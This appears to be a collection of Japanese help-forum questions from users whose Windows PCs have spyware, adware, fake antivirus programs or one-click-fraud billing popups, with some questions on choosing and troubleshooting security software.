IE における、アダルトサイト系プログラムの影響 当方、WindowsXP を使用しております。 アダルトサイトのポップアップを出すプログラムを駆除できたのですが、その後 残存プログラムがあることに気付きました。 IE で、新しくタブを出す際に アダルトサイトのリンク集のようなものが出てきます。 これらの削除方法をご存知の方、アドバイスをいただければ助かります。 よろしくお願い致します。
知り合いの会社のURLを入力し、アクセスしようとしたら「マルチ驚異検出」となり、接続されませんでした。 そのようになる会社ってどうなんでしょう。
パソコンにウイルス対策ソフトを入れようと思ったのですが、MACの場合はどのソフトがオススメですか？ Windowsは得意ですがMACは初心者でして…
誤って開いてしまったＨＰのせいで、数分置きにコンピューターの画面上にアダルトサイトにご登録ありがとうございました。という画面がでます。 お金を払えばこの画面が消えるらしいのですが、こちらは、登録した覚えがありません。 どうすれば、この画面が出なくなるのかを教えていただきたいです。 ネット接続していない状態では画面が出ないのでウイルス的なものでは無いと思います。 本当に困っているのでどうかご回答お願いいたします。
CPUの異常行動 図１のように、インターネットに接続しているとき（エクスプローラを開いているいない関わらず）ＣＰＵが訳もなく定期的にＭＡＸになります。 図２、３のようにexplorer.exeが定期的に暴走しているようです。 またteatimerという不明なプロセスもあります。 図４のような表示が毎回現れるのですが、何回消しても現れます。 spyware.doctorという検出ソフトで spyware.kown.bad.sites application.tracking cookies adware.advertising adware.incredifind の４種が計３００個ほど見つかりました。 しかし上のソフトは除去は有料だったためできませんでした。 ウイルススキャンもしましたが異常はありませんでした。 ＣＰＵを正常に戻すにはどうしたらよいでしょうか。 ご教授お願いいたします。
エロ動画見たんです そしたら、それ以来「あなたは入会しました。７万円を入金してください」という メッセージがデスクトップに出るようになりました Alt+F４で消えるのですが これって一生出続けるのでしょうか？
いままでウィルス対策としてavast!を入れてましたが スパイウェア対策はしてませんでした・・・ フリーでどのソフトを入れたらいいですか？
パソコン内にスパイウェアが発見された時、そのスパイウェアをどのサイトで拾ってしまったのか知る方法はあるのでしょうか？ フリーのMS Security Essentials と Spybot S&D を Windows7+IE8 環境で、常時最新版で利用しています。 どなたかご存じの方いらっしゃいましたら、ご教授ください。
外付けHD（USB接続）をXドライブとして利用しています。気が付いたら、Yドライブが勝てにできて中に、 フォルダ名：「2abbd881dbb4f242288282」のようなものが多数できていました。 フォルダ内部には、例として dotnetfx35setuo.exeというプログラムファイルがあるようです。 これは、ウイルス？スパイウェア？ ゴミ箱（削除）に入れようとすると、「使用中です」としてゴミ箱に捨てられません。 除去したいのですが、教えてください。
Ad-Aware　Free　バージョン8.1.*から8.2.0にアップデートしたのですが、 文字化けではないけどフォントが変だったの入れ直そうと思い、 アンインストールしてインストールするとエラー2343が表示され、 インストールができませんでした。 ＰＣ環境 OS:WindowsXP SP3 内部エラーというのは分かりましたが、内容は良く分かりません。 解決方法を分かる方、どうかよろしくお願いします。
マルウェアの削除方法について教えてください。 UPSを装った悪質なメールを開いてしまい マルウェアをインストールしてしまったようです。 http://www.ups.com/content/jp/ja/about/news/serv … Antivirus XP 2010 というセキュリティソフトを装った アプリケーションが勝手に起動し、偽のソフトを買わせようとします。 それ以外特に困ったことは無いのですが、削除したいです。 最新のウィルスバスターも入っているのですが検出されず 以下のHPを参考にMBAMというソフトを使って マルウェアを数個検出し、削除したのですが 相変らず　Antivirus XP 2010　が起動します。 http://www.bleepingcomputer.com/virus-removal/re … 何か他に方法はないでしょうか？ 以下当方のPCの詳細です。 windows XP ProfessionalService Pack 3 Dell Inspirion 530S Intel Core Duo CPU 2.80GHz このままだと情報漏洩の可能性なども高い…ですよね？ リカバリーしかないのでしょうか…？ Antivirus XP 2008や2009の対処法は色々と見つけたのですが 2010が見つけられず困っています。 ご教示の程お願い致します。
パソコン初心者です。 あるブログがどこの地域から発信されてるのか調べたいのですが、調べる方法を、簡単に詳しく教えていただける方、よろしくお願いします。
いつからかソフトの起動時間が遅くなりました。もしかしたらスパイウェアが関係しているかと思い、このカテゴリーにしましたが原因がさっぱりわかりません。テキストを開くだけでも５～６秒かかります。いつからこうなったかわかりませんが、以前はこんな事はありませんでした。ＬＡＮを組んでいるのですが、ネットワーク上のファイルを開くときだけでなく、マイコンピュータ上のファイルを開くときもなぜかネットワークインジケーターが点灯しますし、ネットワークを切断してファイルを開くと早いです。
マルチバンドレシーバRT-570S で Aバンド2チャンの登録されている盗聴周波数 で サーチすると 140.000 でブーンとずっとなるのですが 297.250 で毎回とまり 無音で 一応ハウリング？もするのですが 音をだしてもなにも音が聞こえません。 Aバンドで4チャンネルにしても2チャンネルと同じで6チャンネルわ 373.050でとまり無音です 自分で盗聴番号メモリーしようとおもうのですが このレシーバわ盗聴番号とか関係あるのでしょうか どのチャンネルにやっても同じような無音やブーンとなり 番号とか関係ないような気がしています うまく伝えられないのですがよろしくお願いします
アドウェアが検知されて駆除したいんですができませんプロセスはファイルにアクセスできません別のプロセスが使用中ですとでます ちなみにavast!ですosはwinxpです駆除の仕方教えてください　至急回答おねがいします
Windows Defenderの定義ファイルが更新できないので非常に困っています。 現在マルウェア対策にWindows Defenderを使っています。 先日までは何ともなかったWindwos Defenderですが1.75.591.0 2010/2/10 6:25を最後に更新ができなくなりました。Microsoft Update は定義ファイル以外のものは更新がなかったし(定義ファイルを更新しようとするとエラーが出る）、手動更新( http://support.microsoft.com/kb/923159/ja )でも何度mpsigstub.exeを押そうが更新されません。 またこのokwaveの似たような質問の回答も試してみたけれど駄目でした。 できればリカバリや再インストールはしたくないです。最悪は無効にするつもりです。 ちなみにパソコンはvista home premium sp2 ウイルス対策にNorton Internet Security 2010を使用しております。
こんにちは。嫌がらせの被害に遭っていたので今後も用心したいと思い、アンチウイルス、アンチスパイウェアなんかの目的で無料のセキュリティソフトを検索してみたんですが、KINGソフトウェアとかアバストとかいろいろ出てきて迷ってしまいます。パソコン関係とても疎くて説明を読んでもよくわからないので、オススメ教えてくださいませんか。
アンチウイルスの同居は許されないが アンチスパイウェアの同居は許される。と聞きます。 そこを詳しく知りたいのですが、 アンチウイルスは１つまで、アンチスパイウェアは幾らでもいい。 という事なのでしょうか？ 現在私は、 アンチウイルスがMicrosoft Security Essentials、 アンチスパイウェアがSpyBot、ad-aware、Windows Defender、 以上の全てのソフトでリアルタイム保護機能を有効にしています。 以上の４つのソフトでリアルタイム保護機能を有効にしては まずいのかと心配になり質問をさせて頂いてます。 もし宜しければ助言など頂ければ幸いです。
byteseekerというサイトについて質問します。 スタートページのタブにbyteseekerが勝手にあらわれてしまいます 「インターネットオプション」→「全般」タブの中の「ホームページ」の一覧の「ｈttp://byteseeker.com/」を消してもしばらくするとまた登録されています。 またしばらく（数十分してからIE起動）すると勝手にでて困っています。 解決方法おねがいします
AD-AWAREを前使っていたのですが、 どういうわけかエラーが出てまた入れなおしたのですが、 やはり以前データが悪さをしているようで検出チェック時にエラーが出ます。 レジストをファイル名を実行してから探しているのですが、 わかりません。教えてください。
昨日，自宅PCのウィルススキャンを行いましたところ， system32内にあった「nameless.exe」と言う名のファイルが 「感染」と判断され，隔離されてしまいました． 以下のことにつきましてご存じの方，よろしくご教授ください． (1)隔離中の「nameless.exe」ですが，そのまま削除してしてしまってもPC動作に影響はありませんでしょうか？ (2)隔離中の「nameless.exe」，どういったファイル(アプリケーション○○に関連する実行ファイル等)なのでしょうか？ (3)回答していただくにあたりまして，追加の情報等は必要でしょうか？→可能な限り提供させていただきます． 【自宅PC環境】 OS：WindowsXpPro. SP3 検知ソフト：avast! ver.5.0.418 定義ファイル：ver.100216-1 以上，何卒よろしくおねがいします．
初心者で何もわからないのですが、 pc tools spyware doctor -11　感染　と右下に表示されて 真ん中下にspyware doctorと赤く表示されたままになっているんですけど、まずい状態なんでしょうか？ どうしたらいいのかわからないので教えてください。 お願いします。
Ad-Ware Freeをインストールしようとしたのですが、何度試みてもエラーが出て正常にインストール出来ません。 インストール途中に下記のエラーが出るのですが、デスクトップにアイコンは作られます。 そのアイコンをクリックしても、ソフトは起動出来ません。 エラーの内容 Runtime error in setup script Line 725:Failed to setdata for 'Display Icon' ＰＣ環境 OS:Winndows2000 SP4 インストール方法 (1)言語：Japan　で　NG (2)言語：English　で　NG いろいろネットでも調べましたが、私が調べた中では、このようなエラーが見つけられず困っています。。 ご存知の方がいらっしゃったら、教えて頂きたく、お願いします。
ひかりの回線のインターネットは、すべてウイルス対策は、必要なし ですか。
ただ乗り無線LANを通じた他人PCデータ傍受。 送受データやPC内データの閲覧です。 これを簡単に可能にするようなフリーソフトがあるとも聞きましたが、 入手についても簡単にできるようなものでしょうか？ また実際どれほど出回っているようなものなのでしょうか？ 無線LANの危険性というよりは、現状における危険度というものを知りたいところです。
「ただ乗り無線LAN」。他人のパソコン侵入は簡単にできること？ ちなみに「簡単なのであれば街で不特定多数が使える無線LANなんて怖くて使用できないではないか！」 と、そんな初歩的な疑念を持ってしまうほどに、私は知識を持ちません。 その程度の私が管理する無線LANは、 誰もがただ乗りできる状態で、数年間使用してきました。 今更ながらですが、自分でも心配にもなり、 今回パスワード照合をしたパソコンでのみしか使用できないように設定しました。 無線LANの危険性についても、もっと知りたいと思っているところです。 気になるのは特に、次のことです。 「知識・技術・装備」をどれほど持っていれば、「ただ乗り無線LAN」を通した (1)他人の送受信データを閲覧、保存 (2)他人のパソコン内のデータを閲覧、保存 できるのかということです。 パソコンのLAN接続についての知識や技術は、私のようなまったくの素人からプロまで様々だと思います。 しかしながら、いったいどれ程の知識や技術があれば、また、 どれほど実際の手順を踏めば(1)や(2)が可能になってくるものなのでしょう。 ちなみに、私がこれまで、 この上ない無防備で危険な状態だとはわかってはいながらも 面倒なセキュリティ設定をしないままにしていた理由（言い訳？）としては ・自宅内でも無線が届きにくいところや届かないところがある。 ・当方以外にも「ただ乗りできる第三者の無線LAN」がたまにキャッチされるが、隣家自体が少ない。 ・「ただ乗り無線LANの第三者も無防備であるからおそらく、パソコンの知識も乏しいはず。 こういった条件的なところを総合的に判断して 「悪意」と「知識・技術・装備」を持ってデータを傍受するような隣人は居なさそう。 というところです。 自分はこれまであまりに甘すぎたと思いましたが、 上記の(1)(2)のことが、どれほどの知識・技術・装備を持っていれば可能となるのか ご意見をお伺いしたいと思います。
IEを立ち上げると、画面の右下に必ず広告窓が出てきて困っています。 その広告窓の上のバーにはRIGHTS INFOという文字で、中の広告は毎回違います。 ×で消しても更新ボタンを押すとまった出てくきて困っています。 ×の横にある？をクリックすると「rightsnetwork.net」というサイトに繋がるのですが・・。 ポップアップのブロックをしても直る気配がありません。Cドライブに自動で何かがインストールされてしまったのかも知れません。どうしたら広告が出ないように設定できるのでしょうか・・。
ウイルスバスターを使用しています。 Yahooを立ち上げようとすると、ウルスバスター２００９のポップアップが出て、 「疑わしい動作を検出しました。セキュリティ保護のため、以下のプログラムがインターネットからデーターを通信するのをブロックしました。 　プログラム名　IEXPLORE.EXE　 発行元　Microsoft Corporation 安全」で、「許可」か「拒否」を選択するように指示されますが、どちらをチェックしても、別の窓が開き、「例外ルールの数が上限に達しているため、新しい例外ルールを追加できません。このルールを追加したい場合は既存のルールのいずれかを削除してください。」と表示され、Yahooを開くことができません。ウルスバスター２００９のヘルプを見るとファイヤウオールかスパイウエアの設定変更で対応できそうなのですが、具体の操作が分からず困っています。教えてください。よろしくお願いします。
「統合型セキュリティ対策ソフト」と「スパイウェア対策ソフト」との関係についてお尋ねします。 現在、「統合型セキュリティ対策ソフト＜ウイルスバスター＞」をインストールしております。 スパイウェア対策をより強固にするため、この上に＜SpyBot＞ などの「スパイウェア対策ソフト」をインストールしようかどうかと迷っております。 このように、セキュリティ対策ソフトを二重にインストールした場合その効力はあるのでしょうか？ 叉、何らかの弊害が生じたりするものでしょうか？ よろしくお願いいたします。
パソコンを立ち上げるとcontrol center best pc healthという画面が出てきて、その画面を閉じることができず、パソコンが使えなくなりました。ライセンスを更新しなさいみたいなメッセージが出てて、怖くてその先にはいってないんですがおそらく何かを購入させられるのだと思います。どうしていいか全くわかりません。OSはXPです。ウィルス対策ソフトは何も入っていません。リカバリディスクもないです。あきらめるしかないのでしょうか？何か解決方法があればお願いします。　
avast!4.8を使用しております。 本日、朝に自動で新しいパッチをインストールし、フルスキャンをした所　「A0133639.exe」「jwsetup_mcj_20040823.exe」の2つに"ウイルスの説明： Win32:Spyware-gen [Spy]"と言うウイルスが検知されました。 そのファイルは、チェストに移動しましたが、そのファイルのどちらも最終更新日は2004/08/23/16:28.52になっております。 検知されたPCはサブマシーンで、あまり起動しておらず、各アプリケーションやOSのアップデートの時に起動する程度でした。 昨日から、少し使用する事があり特に変わったサイトにも訪れていないのですが、感染したようです。(自分的にはウイルスにはかなり気をつけていたのですが) 誤検知ではないかと少し疑い、再度、avast!の更新をした所、新しいパッチをDLしました。これは!と思い、チェストの感染ファイルを再検査しましたが、やはり、ウイルスと判定されました。 念のため、エフセキュアでオンラインスキャンをしましたが(除くavast!チェスト内)、ウイルス等は検視されませんでした。また、avast!の最新の状態でもフルスキャンをしましたが、問題なしです。 チェストにあるファイルを他のソフトで検査する事は可能でしょうか? 皆様なら、どう処理致しますか? ちょっと怖いので、メインPCが立ち上げられません(ネットワーク環境メインpcはavast!有料版) 感染PC　WinXP SP3 mousecomputer　２００６年購入
先日spybotをインストールしチェックしたところ、応答なしで全く動かなかったのでセーフモードで試してみました。二回おなじ具合でうまくいかなかったものの、三回めでやっとチェックと削除に成功しました。その後再起動してみると何よりも先にspybotのウィンドウが出て勝手にチェックが始まり、前回と同じく途中で止まって応答しなくなります。この時他のデスクトップのアイコンをはじめスタートボタンも何も出てこないので他の作業ができません。セーフモードでの作業で何か余計なことでもしたのか必要な事をしなかったのか全然わかりません。壁紙とspybotしか出ていないので終了するのに電源ボタンの長押ししか方法がないのでしょうか。何か解決方法やアドバイスを宜しくお願いします。
アダルトサイトにうっかり同意し、クリックしてしまったところ、ご入会手続きが完了しましたという画面が出てき、請求内容のコメント画面が出てくるようになりました。 無視しようと思っているのですが、消しても消しても、何分かすると出てきます。 何とか消したいのですが、どうすれば良いのかわかりません。 どなたか、コメントを出さないようにする方法を教えてください。 よろしくお願いします。
ero-filehostというサイトを覗いた所、デスクトップに「有料アダルトサイトへのご入会ありがとうございます」の画面が出てきました。 消してもまたすぐ出てきます。 知恵袋やこのサイトで色々見て、無料のソフトウエアなども試しましたが、消すことが出来ません。他の質問で効果のあったという「スパイボット」というのも試しました。 手動削除の方法も調べてみましたが、当方ＰＣド素人ですので専門用語いっぱいで無理でした、、、、 「スタート」→「マイコンピューター」みたいな感じで分かりやすく教えていただけませんか？？？ 助けて下さいっ！！！
お恥ずかしい話ですが、どうやらワンクリック詐欺に引っかかってしまったようです。ファイルを消そうとした時にマウスの誤作動でファイルを実行してしまい請求画面がたびたび出ます。GOLDと言う名のサイトなのですが、対応策をご存知の方はアドバイスを宜しくお願いいたします。OSはXPでシステムの復元も試したのですが、直りませんでした。
トレンドマイクロのセキュリティーレポートで、「リモートファイルロックが初期化されていません」という表示が出ているのですが、これはすでに危険な事態になっているということなのでしょうか？それとも、もしもの場合に備えて初期化して、リモートファイルロックの設定をしておいた方がいいということなのでしょうか？
アダルトサイト請求に困っています。 アダルトサイト請求にこまっています。払わないで良いとは思っていますが、パソコン起動時に、カウントダウン画面が出てきて、5分ごとにでてきます。 どうやって消せばよいでしょうか？ 消し方教えてください。パソコン初心者です。
パソコンを起動すると、カーソルが勝手に動きます。 外部の人に、パソコンを操られているようで心配です。 どのようにしたら止められるでしょうか。 操作している人を逆探知できますか。
spy botで検索したところ、何箇所か問題点が見つかりました。 チェック箇所は Cns Min Core Metrics Direct Track DoubleClick FunWebProducts LinkSynergy Media Plex Microsoft Windows Security InternetExplorer RIght Media Web Trends Live です。 チェックが入っている箇所は全部削除してしまっても大丈夫なのでしょうか？
Microsoft security essentialsを使い始めたんですが立ち上がり時、タスクバーのアイコンが赤×（危険）に成りますす、直ぐにミドリ色（保護されている）には成りますが、これで正常なんでしょうか？？
ｇｏｏのＱ＆Ａを利用中に　スパイウエアtrojanが検出されましたと表示されます。駆除ソフトで駆除されましたと表示されますが　その表示を消しても　その後も何回も出てきますし、ｇｏｏを開くたびにでてきます。 他を開いても表示されません。ｇｏｏを狙ったものでしょうか。 対処方法はありますか。
パソコンのデスクトップ（Ｃドライブ）にデジカメで撮影した画像などを保存していますが、定期的にクリーンアップされてしまいます。システムの復元でもとにもどるのですが、また何日かすると消されてしまします。クリーンアップをタスク化してはいないはずですが、ウイルスでしょうか。ときどき、「レジストリの変更の要求がありました。更新しますか」といったメッセージが出ることがあります。これが原因でしょうか。
Registry Winnerの導入の検討しています。 この種類のソフトはセキュリティソフトと影響干渉は問題ないのでしょうか?
先日、security tool　というスパイウェアが入り込み、サイトでいろいろ調べて駆除をしたのですが（起動してこないので成功していると思います）、その後のPCの挙動がおかしく感じられたので質問させていただきます。 使用しているOSは　WINDOWS XP 駆除後、フリーソフトのSpybot Seach＆Destroy　と　kasperskyの３０日試用版をダウンロードしウィルスチェック＆駆除をしました。 CCleaner　というソフトも使用しクリーンアップとレジストリの問題点も解決しました。 おかしいというのは、 1.起動してからデスクトップ上のアイコンをクリックしても、すぐに反応がなく、5分ほど経ってからウィンドウが開くという状態（今まではすぐに開いて作業ができていました） 2.USBで直接つないでいるプリンターが使えなくなってしまいました。印刷を開始するとスプールはされるのですが一向に印刷が開始されず、３分ぐらいして「このドキュメントの印刷に失敗しました」というエラーが表示されます コントロールパネルで確認すると準備完了という表示もされています（EPSON PM-A850を使用） 3.日本語を入力するときに全角/半角キーで切り替えができなくなり、調べた結果、Alt+全角/半角キーを押すと切り替えることができるようになりました（ちなみにデバイスマネージャをみたらHIDデバイスとなっています） 今の時点で困っているのはこの３点なのですが、このような現象は私だけなんでしょうか？ 他を検索しても駆除後の挙動についての質問がないので駆除ができた方は問題なく動いているのでしょうか？ 説明不足とは思いますが、何かいい解決策があれば教えてください
当方パソコンにそこまで明るくないものですが、表題のトラブルにつき、ググりつつ色々と試してみましたが、現在まで復旧できておりません。 尚OSプリインストールパソコンのためCD無し及びリカバリーCDも未作成のため、再インストールという選択をとれません。 この復旧がうまくいかないと、残る選択択として、HDDを物理的に取り出してデータアクセスやらバックアップという事もありそうですが、必要なToolが無いことなどからこれも出来そうにありません。何卒ご教授お願いいたします。 <環境> WinXP home SP3 update済, CDドライブ無し(故障のため), PC: LL570/G メーカSP2プリインストール済 <症状> ようこそ画面よりログイン後デスクトップ表示したあと、即ログオフという状態になり何も操作できない。原因は直前にマルウェア検出により削除されたファイルのうち何か大事なファイルが一緒に消されてしまった？と思われる。 <経緯> 1.きっかけとしては、マルウェア検出(windows 何とかpro? )後、検出ソフトで全て削除削除　（個々の検知記録は保存したのですが現在そのパソコンを操作できないので、今は見られません。） 2.再起動後、Windowsにログイン後、即ログオフという状態になる。以降現在に至る。 3.セーフモード、Administrator 他のアカウントでも同様、 ⇒これらより、Userinit.exeがおかしくなっていると推測。 4.フロッピー6枚を使用してMicrosoftよりダウンロードして、XP用起動ディスク(SP2)を作成 5.回復コンソールを起動 6.System32内にUserinit.exe 及び wsaupdater.exe を確認 7.以下コマンド入力 C:\windows\system32>copy userinit.exe wsaupdater.exe　その後再起動するが、症状変わらず 8.次に、C:\Windows\servicepackfiles\i386\userinit.exe があったので、これをsystem32以下の同ファイルに上書き⇒症状変わらず 現在ココまで実施しましたが、復旧に至らず途方にくれております。
年明けに実家から戻ってきて、ＰＣを一昨日に立ち上げたら、次の画面が表示されその繰返しで困っています。（何とかネットは見れます。） explorer.exe－アプリケーションエラー ”～　”の命令が”～　”のメモリを参照しました。メモリが”ｗｒｉｔｔｅｎ”になることができませんでした。 　　　　　　　　　　　　　↓ ”問題が発生したため、－－.ｅｘｅを終了します。ご不便をおかけしまして申し訳ありません。”　⇔　これが　－－が代って繰返し表示 されます。 　　　　　　　　　　　　　↓ データ実行防止 ”コンピューター保護のため、このプログラムはＷｉｎｄｏｗｓにより 終了されました。” ノートンインターネットセキュリティ２０１０を入れており、ウィルススキャンしましたが、何も出てこず改善されません。上の３つの繰返し表示、これは知らないうちに何かスパイウェアが入ってきているためでしょうか？　不勉強で申し訳ありませんが、教えていただけないですか。
フリーのセキュリティソフトは、やはり避けた方がいいでしょうか
security toolというものに感染しました。 何をしたらいいのかわからないので 今はセーフティーモードにして電源を切っています。 この先ややこしいのでリカバリーしようと思っています。 リカバリーして初期に戻ったとしてもまだウイルスが潜んでいる可能性ありますか？ その場合はどうすればよいでしょうか？ あとメールアドレスやクレジットナンバー、いろんなパスワードは全て変えた方がいいでしょうか？ 初めて感染したのでわからないので教えてください。
昨日spysheriffに感染しました。（この質問は別PCで書いています。） http://siri.urz.free.fr/log/Spysheriff+RootKit/S … こんな画像が壁紙の上にかぶさるやつです。 駆除の仕方をネットで検索して分かったので、駆除しようと思ったんですが、Winがセーフモードで起動できません。というより起動すると起動ループし始めます。 何か良い方法があったら教えてください。中学生なのでできればお金のかからない、周囲に迷惑のかからない方法がいいです。 CPUはCore2 duo、メモリは4GBです。OSはwinXPです。
質問のタイトルどおりなのですが、USBやDVD、外付けHDDなどをつけたままインターネットにつなぐと、それらの中身を盗まれることってあるのでしょうか？　教えてください。お願いします。
以前は、ノートンとＳＰＹＢＯＴを使っていました。 今は、ウィルスバスター２００９とＷindousＤefender です。 たまに Microsoft Security Essentials を使っています。 殆どでなくウィルスバスター２００９たまにCookie１個くらいでます。 昨日Ａd-Ａｗａｒｅをインストールし完全スキャンをしたところ ２８個（すべてCookie）も出てきました。 これって、有害なのでしょうか？ また、Ａd-Ａｗａｒｅソフトって有効なのでしょうか？ よろしくお願い致します。
単純な質問ですが。 個人ＰＣ内の情報がネット流出する事件がよくニュースに出ます。 ＰＣが感染してもファイアーウォールが在れば大丈夫なのでしょうか。 それともファイアーウォールは役に立たないのでしょうか。
カスペルスキーの期限が切れました。 毎年この時期に更新だと何かとあわただしいので、 春ごろまでセキュリティ関連はフリーソフトを使おうと思っています。 avastと相性がいいとのことでPC Tools firewallを入れたのですが、 その時にSpyware Doctorも入れてしまいました。 沢山スパイウェアを検出したと出て、 駆除するならお金を払えとのことだったのでネットで色々見たら Spyware Doctorは評判が悪いですね。 このソフトとはあまり関わりたくないのですが アンインストールすれば綺麗に削除できるでしょうか？ また、Spyware Doctorの代わりに何かおすすめはありませんか？ Vistaです。
スパイウェア対策にspybotとADawareを使っています。updateがうまく行かなかったり、エラー表示が出たりするので、つい最近、両方とも最新版にインストールし直しました。ところが、ADaware８，０７ を入れた後、急にパソコンの動きが重くなりました。どうすれば改善するのでしょうか。ちなみに、ADaware８，０７はstart upには入れていませんし、タスクバーの中でも非表示にしています。 ウイルスソフトとして、セマンテックスのインターネットセキュリティ－2003が入っています。Anti-VirusのAuto-Protectは有効になっています。 　気になることがあります。ADaware８，０７のインストール時に、ADawareだけを選択したのですが、どういうわけか、タスクバーにADawareのアイコンが勝手に現れて、AD-watch liveのインストールを完了するにはコンピューターを再起動させて下さいという表示が何度も現れます。消しても消しても現れます。 このこととパソコンの動きが重くなったことと関係があるのかどうかわかりません。 　よろしくお願いします。
ＯＳはビスタで、ブラウザは Ｆｉｒｅｆｏｘ３.５なんですが 先日から急に…なんですが パソコンを起動する度に アドウェアのヒット画面が出る様に、なりました ただ、この画面 以前にもフルスキャンを実行した時 クッキーと共にも出てたんですが クッキーならヒットしても、特に問題は無いと判断して そのままでした しかし、ここの所 パソコンを起動する度に 自動で、この画面が出る様に、なり 煩わしく、なりました ただ、何かの時に 誤って、設定等を変更したのかとも思ったんですが 何処を見れば良いのかも分かりませんでした もし設定等が変更だった場合 どう見れば良いんでしょうか？
インターネットで遊んでいたらファイヤーウォールから 「これこれのソフトが外部と通信したがってますけどいいですか？」 とのアラートが出ました。 いつもソフトをインストールした後１度だけ出るアラートです 新しくソフトをインストールした覚えも無いのでよくよく見てみますと ファイルの場所はWindowsフォルダの下のtempフォルダで ファイル名もTM109.tmpと何か良くわからない物だったのでアクセス禁止にしました そうするとまもなく別のファイルからまたアラートが出ました。 ファイルの場所はWindowsフォルダの下のtempフォルダ ソフト名はSandboxie Start 3.26とされていて アイコンも黄色い◇に赤い点々がある物でやはり覚えが無いので禁止しました そして３度目また別のファイルから ファイルの場所はWindowsフォルダの下のtempフォルダ ソフト名はSandboxie Start 3.26とされていて、これも禁止しました ここらでおかしいなと思い始め、tempフォルダーを調べると ファイル名~TM107.tmp　、　~TM108.tmp　、~TM109.tmpの３つのファイルが それぞれ外部とアクセスしようとしていたことがわかりました (それぞれサイズは30k～40k程度です) アクセスはしてませんでしたが起動していたのでとりあえず タスクマネージャーからプロセスを停止しました msconfigをみてみると~TM107.tmp　がスタートアップに登録されていました(解除済み) アラートが出る数十分前にダウンロードして解凍したファイル(音声ファイル)があったので それに入ってたのかなあと思います 以上の経緯から外部との通信はしてなさそうなので(たぶん) 情報が漏えいしたということはなさそうですが 取り除くにはどういう対処をした方がよさそうですか？ 既存のウイルスかどうか判別できなかったのでご教授頂けたらと思います 余談ですが このSandboxieというソフトは実在していて「危なそうなソフトを仮想領域で実行し、確認して ヤバイソフトだったら痕跡も残さずに消去する」ソフトだそうです このウイルスを作った人は、そういうソフトの評判を落としたくて作ったのかもしれませんね(?)
暇なときにでも こんにちは。早速質問させていただきます。 私はよくネットショッピングをするのですが、 キーボードで入力した情報は盗まれやすい？ということでスパイウェア対策として、 いつも使うパソコンの「単語/用例の登録」で 例えばクレジット番号が1234-5678-9101-2345だとしたら よみがなを“あ”として最初の4桁“1234”を登録、 同じように“い”“う”“え”と全て登録しておいて、 入力する際“あ”を変換して入力するようにしているのですが これって対策として効果はありますか？ あと、数字しか入力できない時は、wordなどに一度入力したものを コピーしてきて、入力しています。 これについても効果があるか、教えてください。 詳しい方、よろしくお願いします。
security toolに感染しました。 その後、システムの復元を行った後にrkill→Malwarebytes' Anti-Malwareと駆除ツールを使ったのですが、それでも起動時やプログラムを開く際など以前よりもかなり重くなってしまいました。 まだ完全にsecurity toolが駆除されていないのでしょうか？
私はウイルスバスター2010を使っています。 それにはファイアウォール機能がついているのですが、windowsの機能にも ファイアウォールがついているので競合しないようwindowsのほうを無効にしています。 ここまではいいのですが、無線LANブロードバンドルータ(Logitec LAN-W300N/R:接続は有線)の機能のファイアウォールも無効にしておくべきなのでしょうか？
トロイの木馬（JS:ScriptIP-inf）に感染後2週間放置していたかもしれません。昨日12月27日海外ヤフーのメールアドレスとパスワードを入力してログインしようとしたところ、ウイルス対策ソフトAVASTがトロイの木馬を発見しました。そこで完全スキャンを行ったところ、2週間前の12月12日が最終更新日となっているトロイの木馬に感染したファイルが20個以上ありました。さらに、半年前の6月10日が最終更新日の感染ファイルもひとつありました。すべて、AVASTのウイルスチェストに隔離しました。 AVASTのウイルスチェストの情報の一例は、以下の通りです。 元のファイル名CAVWIO3A.htm 元のフォルダ　C:\Documents and Settings\***\Local Setting\Temporary Internet Files\Content.IE5\6VT15T43 ファイル容量　5614 最後に編集した時刻　2009/12/12 15:29:27 チェストに移動した時刻　2009/12/27 23:49:27 カテゴリ　感染していたファイル ウイルスの説明　JS: ScriptIP-inf ファイルID ** ・トロイの木馬を2週間も放置していたのでしょうか？そうであれば、どのような被害が予想されるでしょうか？ ・AVASTのチェストからこのトロイの木馬を削除しても大丈夫でしょうか？ ・その後symantecのオンラインスキャンでスキャンしましたが、これ以上のウイルスは出てきませんでした。これで、ウイルス洗浄は完了でよいでしょうか？ たくさん質問をしてしまい、すみませんが、一部だけでもいいですので、どなたかご教授くださいますよう、どうぞ宜しくお願い申し上げます。
現在は、 avast(4.8HE)　ad-aware(Ver8.1.3)　SpywareBlaster(Ver4.2) を使用しています 以前は、spy-botを使用していましたが、SpywareBlasterと 相性がよく無いと見た記憶があり、その頃から使用していませんでした 今まで、特に不満は無かったのですが、 ad-awareをAEからバージョンアップした際にad-aware　free(Ver8.1.3) になり、ad-watch　liveがPC起動のたびに常駐するため、 毎回手動で無効にするため、非常に不便になりました ad-watch　liveをPC起動と同時に有効になってしまう事は防げないようなので ad-awareを捨てて、他に乗り換えようかと思います ※下記質問番号：5514634の回答で Ad-Aware Free版であれば、常駐保護がプロセス監視だけ との事なので、気にしなくても良いレベルなのかもしれませんが・・・ 常駐監視はavast(とＩＥ８？)メインで その他、非常駐のソフト(常駐があっても、１回の操作で無効化できる) でお勧めあればご教示願います ※できれば、使い方が説明されているところ(情報が新しいところ)も 紹介していただければ幸いです 全て、フリーソフトを希望します 追記 ad-awareはAEの時は最新更新日が表示されてたのに ad-aware　free(Ver8.1.3)は最新更新日すら表示されなくなりました。 こちらが古いのかと思うくらいで セキュリティソフトの最新バージョンを記載しているところは無いでしょうか？
outlook expressに迷惑メールが多く、ルールを指定しても、その他のメールが来て困っています。 特定のメールを受信しないのではなく、特定のメールのみを受信するように設定は出来ないのでしょうか。 ご存知の方はよろしくお願い致します。
Microsoft Forefront Client Security を入れていましたが、個人レベルにはOneCare の方が使いやすいと思い前者をアンインストールし後者と入れ替えました。 ところが最近OneCareが「提供されるアップデートがインストールされていないので要注意！」を出すようになりました。 MicrosoftのHPでアップデートを実行すると、Forefront Client Security のアップデートが失敗し、それが原因で「要注意」が出るようです。 Forefront はアンインストールしているので、ダウンロードしてもアップデート出来ない状況なんでしょうが、まだ何かが残っていてアップデートの必要性をアピールしているのでしょう。 上記の状況から、OneCare に「要注意」を出させないようにはどうすればいいでしょうか。 ご教授ください、よろしくお願いします。
　PCが遅いのでスタートアップの中身を見たところhklm\software云々が沢山あります。きっとこれはウイルスだと思うのですが、何か対策はありますでしょうか、スタートアップからはずせば問題なくなるのでしょうか、どなたかご指導下さるようお願いします。
